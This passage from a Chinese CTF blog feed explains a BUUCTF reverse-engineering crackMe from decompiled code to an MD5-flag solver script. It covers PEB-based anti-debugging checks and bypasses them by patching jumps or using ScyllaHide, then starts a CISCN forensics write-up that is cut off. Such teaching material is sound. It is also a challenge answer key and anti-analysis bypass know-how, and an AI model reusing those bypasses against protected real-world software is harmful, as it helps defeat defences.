class="hljs-comment">// eax</span><br>  FILE *v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// [esp+3h] [ebp-405h]</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [esp+4h] [ebp-404h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+5h] [ebp-403h]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [esp+104h] [ebp-304h]</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [esp+105h] [ebp-303h]</span><br>  <span class="hljs-type">char</span> v8; <span class="hljs-comment">// [esp+204h] [ebp-204h]</span><br>  <span class="hljs-type">char</span> v9; <span class="hljs-comment">// [esp+205h] [ebp-203h]</span><br>  <span class="hljs-type">char</span> v10; <span class="hljs-comment">// [esp+304h] [ebp-104h]</span><br>  <span class="hljs-type">char</span> v11; <span class="hljs-comment">// [esp+305h] [ebp-103h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Come one! Crack Me~~~\n&quot;</span>);<br>  v10 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;v11, <span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>u);<br>  v8 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;v9, <span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>u);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user(6-16 letters or numbers):&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v10);<br>        v0 = (FILE *)sub_4024BE();<br>        fflush(v0);<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( !(<span class="hljs-type">unsigned</span> __int8)sub_401000(&amp;v10) );<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;password(6-16 letters or numbers):&quot;</span>);<br>      <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v8);<br>      v1 = (FILE *)sub_4024BE();<br>      fflush(v1);<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( !(<span class="hljs-type">unsigned</span> __int8)sub_401000(&amp;v8) );<br>    sub_401090(&amp;v10);<br>    v6 = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">memset</span>(&amp;v7, <span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>u);<br>    v4 = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">memset</span>(&amp;v5, <span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>u);<br>    v3 = ((<span class="hljs-type">int</span> (__cdecl *)(<span class="hljs-type">char</span> *, <span class="hljs-type">char</span> *))loc_4011A0)(&amp;v6, &amp;v4);<br>    <span class="hljs-keyword">if</span> ( sub_401830((<span class="hljs-type">int</span>)&amp;v10, &amp;v8) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 )<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(&amp;v4);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(&amp;v6);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>不难看出，程序中存在一个死循环，而需要让代码中的死循环跳出，那么sub_401830和loc_4011A0需要成立的，但是loc_4011A0这个函数的参数都是前面已经确定好的且不可控为0，所以这个函数是不需要去分析的。故sub_401830是我们重点分析的目标。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> __cdecl <span class="hljs-title function_">sub_401830</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+18h] [ebp-22Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+1Ch] [ebp-228h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+28h] [ebp-21Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+30h] [ebp-214h]</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [esp+36h] [ebp-20Eh]</span><br>  <span class="hljs-type">char</span> v8; <span class="hljs-comment">// [esp+37h] [ebp-20Dh]</span><br>  <span class="hljs-type">char</span> v9; <span class="hljs-comment">// [esp+38h] [ebp-20Ch]</span><br>  <span class="hljs-type">unsigned</span> __int8 v10; <span class="hljs-comment">// [esp+39h] [ebp-20Bh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v11; <span class="hljs-comment">// [esp+3Ah] [ebp-20Ah]</span><br>  <span class="hljs-type">char</span> v12; <span class="hljs-comment">// [esp+3Bh] [ebp-209h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp+3Ch] [ebp-208h]</span><br>  <span class="hljs-type">char</span> v14; <span class="hljs-comment">// [esp+40h] [ebp-204h]</span><br>  <span class="hljs-type">char</span> v15; <span class="hljs-comment">// [esp+41h] [ebp-203h]</span><br>  <span class="hljs-type">char</span> v16; <span class="hljs-comment">// [esp+140h] [ebp-104h]</span><br>  <span class="hljs-type">char</span> v17; <span class="hljs-comment">// [esp+141h] [ebp-103h]</span><br><br>  v4 = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  v11 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v16 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;v17, <span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>u);<br>  v14 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;v15, <span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>u);<br>  v9 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( v6 &lt; <span class="hljs-built_in">strlen</span>(a2) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">isdigit</span>(a2[v6]) )<br>    &#123;<br>      v8 = a2[v6] - <span class="hljs-number">48</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">isxdigit</span>(a2[v6]) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">24</span>) + <span class="hljs-number">12</span>) != <span class="hljs-number">2</span> )<br>        a2[v6] = <span class="hljs-number">34</span>;<br>      v8 = (a2[v6] | <span class="hljs-number">0x20</span>) - <span class="hljs-number">87</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v8 = ((a2[v6] | <span class="hljs-number">0x20</span>) - <span class="hljs-number">97</span>) % <span class="hljs-number">6</span> + <span class="hljs-number">10</span>;<br>    &#125;<br>    v9 = v8 + <span class="hljs-number">16</span> * v9;<br>    <span class="hljs-keyword">if</span> ( !((<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)(v6 + <span class="hljs-number">1</span>) % <span class="hljs-number">2</span>) )<br>    &#123;<br>      *(&amp;v14 + v3++) = v9;<br>      v9 = <span class="hljs-number">0</span>;<br>    &#125;<br>    ++v6;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( (<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)v5 &lt; <span class="hljs-number">8</span> )<br>  &#123;<br>    v10 += byte_416050[++v11];<br>    v12 = byte_416050[v11];<br>    v7 = byte_416050[v10];<br>    byte_416050[v10] = v12;<br>    byte_416050[v11] = v7;<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">104</span>) &amp; <span class="hljs-number">0x70</span> )<br>      v12 = v10 + v11;<br>    *(&amp;v16 + v5) = byte_416050[(<span class="hljs-type">unsigned</span> __int8)(v7 + v12)] ^ *(&amp;v14 + v4);<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xFF</span> )<br>    &#123;<br>      v10 = <span class="hljs-number">-83</span>;<br>      v11 = <span class="hljs-number">43</span>;<br>    &#125;<br>    sub_401710(&amp;v16, a1, v5++);<br>    v4 = v5;<br>    <span class="hljs-keyword">if</span> ( v5 &gt;= &amp;v14 + <span class="hljs-built_in">strlen</span>(&amp;v14) + <span class="hljs-number">1</span> - &amp;v15 )<br>      v4 = <span class="hljs-number">0</span>;<br>  &#125;<br>  v13 = <span class="hljs-number">0</span>;<br>  sub_401470(&amp;v16, &amp;v13);<br>  <span class="hljs-keyword">return</span> v13 == <span class="hljs-number">43924</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先，从最后一行我们可以看出，v13需要等于43924，所以打开sub_401470函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs c">_DWORD *__usercall sub_401470@&lt;eax&gt;(<span class="hljs-type">int</span> a1@&lt;ebx&gt;, _BYTE *a2, _DWORD *a3)<br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// ST28_4</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// ST20_4</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// edi</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// ST1C_4</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">char</span> v13; <span class="hljs-comment">// di</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// ST18_4</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// ST14_4</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">char</span> v18; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v19; <span class="hljs-comment">// ST10_4</span><br>  <span class="hljs-type">int</span> v20; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v23; <span class="hljs-comment">// ST0C_4</span><br>  <span class="hljs-type">int</span> v24; <span class="hljs-comment">// eax</span><br>  _DWORD *result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v26; <span class="hljs-comment">// edx</span><br><br>  <span class="hljs-keyword">if</span> ( *a2 == <span class="hljs-number">100</span> )<br>  &#123;<br>    *a3 |= <span class="hljs-number">4u</span>;<br>    v4 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a3 ^= <span class="hljs-number">3u</span>;<br>  &#125;<br>  v3 = *a3;<br>  <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">1</span>] == <span class="hljs-number">98</span> )<br>  &#123;<br>    _EAX = a3;<br>    *a3 |= <span class="hljs-number">0x14</span>u;<br>    v6 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a3 &amp;= <span class="hljs-number">0x61</span>u;<br>    _EAX = (_DWORD *)*a3;<br>  &#125;<br>  __asm &#123; aam &#125;<br>  <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">2</span>] == <span class="hljs-number">97</span> )<br>  &#123;<br>    *a3 |= <span class="hljs-number">0x84</span>u;<br>    v9 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a3 &amp;= <span class="hljs-number">0xA</span>u;<br>  &#125;<br>  v8 = *a3;<br>  v10 = ~(a1 &gt;&gt; <span class="hljs-number">-91</span>);<br>  <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">3</span>] == <span class="hljs-number">112</span> )<br>  &#123;<br>    *a3 |= <span class="hljs-number">0x114</span>u;<br>    v12 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a3 &gt;&gt;= <span class="hljs-number">7</span>;<br>  &#125;<br>  v11 = *a3;<br>  v13 = v10 - <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">4</span>] == <span class="hljs-number">112</span> )<br>  &#123;<br>    *a3 |= <span class="hljs-number">0x380</span>u;<br>    v15 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a3 *= <span class="hljs-number">2</span>;<br>  &#125;<br>  v14 = *a3;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">24</span>) + <span class="hljs-number">12</span>) != <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">5</span>] == <span class="hljs-number">102</span> )<br>    &#123;<br>      *a3 |= <span class="hljs-number">0x2DC</span>u;<br>      v17 = *a3;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      *a3 |= <span class="hljs-number">0x21</span>u;<br>    &#125;<br>    v16 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">5</span>] == <span class="hljs-number">115</span> )<br>  &#123;<br>    *a3 |= <span class="hljs-number">0xA04</span>u;<br>    v18 = (<span class="hljs-type">char</span>)a3;<br>    v20 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v18 = (<span class="hljs-type">char</span>)a3;<br>    *a3 ^= <span class="hljs-number">0x1AD</span>u;<br>  &#125;<br>  v19 = *a3;<br>  _AL = v18 - v13;<br>  __asm &#123; daa &#125;<br>  <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">6</span>] == <span class="hljs-number">101</span> )<br>  &#123;<br>    *a3 |= <span class="hljs-number">0x2310</span>u;<br>    v24 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a3 |= <span class="hljs-number">0x4A</span>u;<br>  &#125;<br>  v23 = *a3;<br>  <span class="hljs-keyword">if</span> ( a2[<span class="hljs-number">7</span>] == <span class="hljs-number">99</span> )<br>  &#123;<br>    result = a3;<br>    *a3 |= <span class="hljs-number">0x8A10</span>u;<br>    v26 = *a3;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a3 &amp;= <span class="hljs-number">0x3A3</span>u;<br>    result = (_DWORD *)*a3;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以知道我们需要a2满足所有的if，v13此时就可以等于43924</p><p>也就是v16需要是这样一个BYTE数组：<br>[0x64,0x62,0x61,0x70,0x70,0x73,0x65,0x63]，即ddappsec<br>v16的值知道了，我们还需要知道这个值是怎么来的</p><p>我们可以从第二部分代码第64行得知，byte_416050是通过与变换后的密码异或得到v16。且我们现在已经知道账号为welcomebeijing，所求的是账号的密码。因此我们需要通过动态调试，获取byte_416050的值</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90.assets/20200906211413377.png" alt="在这里插入图片描述"></p><p>在x32dbg中将汇编断点打在xor上，观察寄存器中的内容，循环看8次就得到我们要的内容了<br>记录如下：<br>[0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd]</p><p>接下来只需要编写脚本解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>key = [<span class="hljs-number">0x2a</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xcd</span>]<br>text = <span class="hljs-string">&quot;dbappsec&quot;</span><br><br>flag = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)):<br>    flag.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(text[i])^key[i]).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))<br><br>final_flag=<span class="hljs-string">&#x27;&#x27;</span>.join(each <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> flag)<br>md = hashlib.md5(final_flag.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><span class="hljs-built_in">print</span>(md)<br></code></pre></td></tr></table></figure><p>以上就是和师傅们的WP大同小异的部分。我想重点说明的是反调试部分，也就是那些莫名其妙的__readfsdword。我所看的WP中都没能解答我对这些东西的疑惑，只能自己去找了。</p><p>《逆向工程核心原理》第51章或许能解答我们的一些疑惑（侵删）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90.assets/20200906214224874.png" alt="在这里插入图片描述"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90.assets/20200906214259179.png" alt="在这里插入图片描述"><br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90.assets/20200906214323100.png" alt="在这里插入图片描述"></p><p>我们需要重点关注的就是最后一页的提示部分，不难看出，我们题目中出现的几个反调试手段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">24</span>) + <span class="hljs-number">12</span>) != <span class="hljs-number">2</span> )<br><span class="hljs-keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">104</span>) &amp; <span class="hljs-number">0x70</span> )<br><span class="hljs-keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xFF</span> )<br></code></pre></td></tr></table></figure><p>其实就是寻找PEB结构体中的特定字段来判断是否处于被调试的状态，其中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xFF</span> )<br></code></pre></td></tr></table></figure><p>从书中我们可以看出就是我们的字段BeingDebugged，我们的IsDebuggerPresent最后寻找的东西其实就是这个字段</p><p>而</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">104</span>) &amp; <span class="hljs-number">0x70</span> )<br></code></pre></td></tr></table></figure><p>这个其实从PEB的结构中我们也不难看出也是反调试中经常出现的字段NtGlobalFlag</p><p>最后这个：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">24</span>) + <span class="hljs-number">12</span>) != <span class="hljs-number">2</span> )<br></code></pre></td></tr></table></figure><p>一步步跟进，首先__readfsdword(0x30u) + 24)，这玩意也是经常用在反调试中的字段ProcessHeap，它是一个结构体，那偏移量为12是什么呢？我们再补一张图：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90.assets/20200906215821763.png" alt="在这里插入图片描述"></p><p>可以看出是字段Flags，如同书中所说，进程处于被调试状态时，它被设置成了特定的值（从我们的题目中我们可以得出这个值在正常情况下应该是2)</p><p>至此，我们大体上弄明白了题目中出现的反调试手段。</p><p>识别出来了我们需要进行反反调试，绕过反调试代码执行函数的正常逻辑。</p><p>这里给出几个比较常见的手段：</p><p>其一是动调时手动修改代码，比如汇编下把jz改成jmp&#x2F;jnz，我改成了jnz，机器码是74改成75</p><p>另外一个就是使用插件ScyllaHide了，这里我们只需要使用Basic模块即可（准确来说Hide from PEB就行）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90.assets/20200906230406657.png" alt="在这里插入图片描述"></p><p>总结一下，题目本身不难。有坑的地方即是那几个反调试的部分会修改那8个值扰乱分析。当识别出并过掉后题目基本就没问题了。</p><p>另外一点就是当fs和0x30同时出现在我们的代码中时需要额外注意。这表明PEB要被访问了，出题人要开始整活了。</p><p>PEB结构体是反调试手段中最基础也是经常会用到的技术。我们不能局限于只是能识别一些API如IsDebuggerPresent，而是同时要对背后的底层有自己的认识，这样在IDA没能识别出来时我们也能有自己正确的判断。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN 2020 线上初赛 电脑被黑 WP</title>
    <link href="/2020/08/01/writeup/CISCN%202020%20%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B%20%E7%94%B5%E8%84%91%E8%A2%AB%E9%BB%91%20WP/"/>
    <url>/2020/08/01/writeup/CISCN%202020%20%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B%20%E7%94%B5%E8%84%91%E8%A2%AB%E9%BB%91%20WP/</url>
    
    <content type="html"><![CDATA[<p>文件下载下来是ext linux磁盘文件，挂载上去后可以得到四个文件</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/CISCN%202020%20%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B%20%E7%94%B5%E8%84%91%E8%A2%AB%E9%BB%91%20WP.assets/20200821104313705.png" alt="在这里插入图片描述"></p><p>在demo中使用IDA可以看到加密过程，核心代码为</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/CISCN%202020%20%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B%20%E7%94%B5%E8%84%91%E8%A2%AB%E9%BB%91%20WP.assets/20200821104340181.png" alt="在这里插入图片描述"></p><p>推测为加密后将加密的flag删除了，我们只需要恢复加密后的flag并用逆向还原即可</p><p>故我们使用工具extundelete将数据恢复，命令为：</p><p>extundelete disk_dump –restore-all</p><p>可以恢复被删除的加密flag</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/CISCN%202020%20%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B%20%E7%94%B5%E8%84%91%E8%A2%AB%E9%BB%91%20WP.assets/20200821104356833.png" alt="在这里插入图片描述"></p><p>之后编写脚本解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;C:\Users\shinelon\Downloads\disk_dump\flag.txt&quot;</span>, <span 